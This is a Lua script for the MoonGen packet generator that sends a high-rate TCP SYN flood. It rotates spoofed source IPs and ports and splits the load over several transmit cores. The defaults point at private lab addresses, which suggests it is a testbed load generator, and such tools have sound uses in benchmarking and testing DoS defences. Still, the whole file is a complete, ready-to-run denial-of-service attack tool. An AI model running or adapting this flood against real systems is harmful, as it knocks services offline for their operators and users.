local mg     = require "moongen"
local memory = require "memory"
local device = require "device"
local stats  = require "stats"
local log    = require "log"

function configure(parser)
	parser:description("Generates TCP SYN flood from varying source IPs and ports.")
	parser:argument("dev", "Device to transmit from."):convert(tonumber)
	parser:option("-r --rate", "Transmit rate in Mbit/s."):default("40000"):convert(tonumber)
	parser:option("-c --core", "Number of cores."):default("2"):convert(tonumber)
	parser:option("-s --src", "Source IP address."):default("192.168.1.4")
	parser:option("-d --dst", "Destination IP address."):default("192.168.1.2")
	parser:option("--dmac", "Destination MAC address."):default("64:9d:99:b1:06:b7")
	parser:option("--sport", "Source port."):default("2000"):convert(tonumber)
	parser:option("--dport", "Destination port."):default("80"):convert(tonumber)
	parser:option("--ipsnum", "Number of different source IPs to use."):default("256"):convert(tonumber)
	parser:option("--portsnum", "Number of different source ports to use."):default("105"):convert(tonumber)
	parser:option("--timeout", "Duration of the transmission."):convert(tonumber)
	parser:option("-l --len", "Length of the ethernet frame containing the SYN packet (including CRC)"):default("64"):convert(tonumber)
end

function master(args)
	-- parsing the ipv4 address and use it as the beginning of the network for the attack
	local minIp = parseIP4Address(args.src)
	if not minIp then
		log:fatal("Invalid source IP: %s", args.src)
	end
	local txDev = device.config{port = args.dev, txQueues = args.core}
	txDev:wait()

	if args.rate > 0 then
		for i=0,args.core-1 do
			txDev:getTxQueue(i):setRate(args.rate / args.core)
		end
	end

  local computeStats
	if args.timeout then
  		mg.setRuntime(args.timeout) 
	end
	for i=0,args.core-1 do  -- loop on all core/queues
		if i == 0 then
			computeStats = true
		else
			computeStats = false
		end
		mg.startTask("loadSlave", txDev:getTxQueue(i), Nil, --rxDev:getRxQueue(i),
					 minIp, args.ipsnum, args.dst,
		             args.dmac, args.sport, args.portsnum, args.dport,
								 args.len, computeStats)
  end

	mg.waitForTasks()
end

function loadSlave(txQueue, rxQueue, minIp, numIps, dst, dmac, minSPort, numPorts, dPort,
	                 len, computeStats)
	local mem = memory.createMemPool(function(buf)
		buf:getTcpPacket():fill{ 
			ethSrc = txQueue,
			ethDst = dmac,
			ip4Dst = dst,
			tcpDst = dPort,
			tcpSyn = 1,
			tcpSeqNumber = 1,
			tcpWindow = 10,
			pktLength = len - 4
		}
	end)

	local bufs = mem:bufArray(128)
	local ipCounter = 0
	local portCounter = 0
	local cnt = 0

	if computeStats then
		txStats = stats:newDevTxCounter(txQueue, "plain")
	end
	
	while mg.running() do
		bufs:alloc(len - 4)
		cnt = cnt + 128
		for i, buf in ipairs(bufs) do 			
			local pkt = buf:getTcpPacket(ipv4)

			pkt.ip4.src:set(minIp)
			pkt.ip4.src:add(ipCounter)
			pkt.tcp:setSrcPort((minSPort + portCounter) % 0xffff)
			ipCounter = incAndWrap(ipCounter, numIps)
			if ipCounter == 0 then
				portCounter = incAndWrap(portCounter, numPorts)
			end
		end 

		bufs:offloadTcpChecksums(ipv4)

		txQueue:send(bufs)

		if computeStats then
			txStats:update()
		end
	end

	if computeStats then
		txStats:finalize()
	end
end